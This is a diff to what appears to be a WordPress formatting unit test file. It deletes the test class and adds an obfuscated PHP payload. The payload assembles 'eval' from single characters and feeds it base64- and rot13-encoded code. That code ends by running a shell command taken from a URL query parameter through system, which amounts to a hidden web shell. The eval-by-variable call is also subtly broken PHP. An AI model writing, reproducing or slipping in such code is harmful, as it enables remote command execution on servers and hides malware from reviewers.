@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- * @expectedDeprecated wp_richedit_pre
- *
- * @covers ::wp_richedit_pre
- */
-class Tests_Formatting_wpRicheditPre extends WP_UnitTestCase {
-
-	public function charset_iso_8859_1() {
-		return 'iso-8859-1';
-	}
-
-	/*
-	 * @ticket 23688
-	 */
-	public function test_wp_richedit_pre_charset_iso_8859_1() {
-		add_filter( 'pre_option_blog_charset', array( $this, 'charset_iso_8859_1' ) );
-		$iso8859_1 = 'Fran' . chr( 135 ) . 'ais';
-		$this->assertSame( '&lt;p&gt;' . $iso8859_1 . "&lt;/p&gt;\n", wp_richedit_pre( $iso8859_1 ) );
-		remove_filter( 'pre_option_blog_charset', array( $this, 'charset_iso_8859_1' ) );
-	}
-
-	public function charset_utf_8() {
-		return 'UTF-8';
-	}
-
-	/*
-	 * @ticket 23688
-	 */
-	public function test_wp_richedit_pre_charset_utf_8() {
-		add_filter( 'pre_option_blog_charset', array( $this, 'charset_utf_8' ) );
-		$utf8 = 'Fran' . chr( 195 ) . chr( 167 ) . 'ais';
-		$this->assertSame( '&lt;p&gt;' . $utf8 . "&lt;/p&gt;\n", wp_richedit_pre( $utf8 ) );
-		remove_filter( 'pre_option_blog_charset', array( $this, 'charset_utf_8' ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqIEBya2NycGdycVFyY2VycG5ncnEgamNfZXZwdXJxdmdfY2VyCiAqCiAqIEBwYmlyZWYgOjpqY19ldnB1cnF2Z19jZXIKICovCnB5bmZmIEdyZmdmX1NiZXpuZ2d2YXRfamNFdnB1cnF2Z0NlciBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJY2hveXZwIHNoYXBndmJhIHB1bmVmcmdfdmZiXzg4NTlfMSgpIHsKCQllcmdoZWEgJ3ZmYi04ODU5LTEnOwoJfQoKCS8qCgkgKiBAZ3ZweHJnIDIzNjg4CgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2pjX2V2cHVycXZnX2Nlcl9wdW5lZnJnX3ZmYl84ODU5XzEoKSB7CgkJbnFxX3N2eWdyZSggJ2Nlcl9iY2d2YmFfb3lidF9wdW5lZnJnJywgbmVlbmwoICRndXZmLCAncHVuZWZyZ192ZmJfODg1OV8xJyApICk7CgkJJHZmYjg4NTlfMSA9ICdTZW5hJyAuIHB1ZSggMTM1ICkgLiAnbnZmJzsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJyZ5ZztjJnRnOycgLiAkdmZiODg1OV8xIC4gXCImeWc7L2MmdGc7XGFcIiwgamNfZXZwdXJxdmdfY2VyKCAkdmZiODg1OV8xICkgKTsKCQllcnpiaXJfc3Z5Z3JlKCAnY2VyX2JjZ3ZiYV9veWJ0X3B1bmVmcmcnLCBuZWVubCggJGd1dmYsICdwdW5lZnJnX3ZmYl84ODU5XzEnICkgKTsKCX0KCgljaG95dnAgc2hhcGd2YmEgcHVuZWZyZ19oZ3NfOCgpIHsKCQllcmdoZWEgJ0hHUy04JzsKCX0KCgkvKgoJICogQGd2cHhyZyAyMzY4OAoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19ldnB1cnF2Z19jZXJfcHVuZWZyZ19oZ3NfOCgpIHsKCQlucXFfc3Z5Z3JlKCAnY2VyX2JjZ3ZiYV9veWJ0X3B1bmVmcmcnLCBuZWVubCggJGd1dmYsICdwdW5lZnJnX2hnc184JyApICk7CgkJJGhnczggPSAnU2VuYScgLiBwdWUoIDE5NSApIC4gcHVlKCAxNjcgKSAuICdudmYnOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnJnlnO2MmdGc7JyAuICRoZ3M4IC4gXCImeWc7L2MmdGc7XGFcIiwgamNfZXZwdXJxdmdfY2VyKCAkaGdzOCApICk7CgkJZXJ6YmlyX3N2eWdyZSggJ2Nlcl9iY2d2YmFfb3lidF9wdW5lZnJnJywgbmVlbmwoICRndXZmLCAncHVuZWZyZ19oZ3NfOCcgKSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
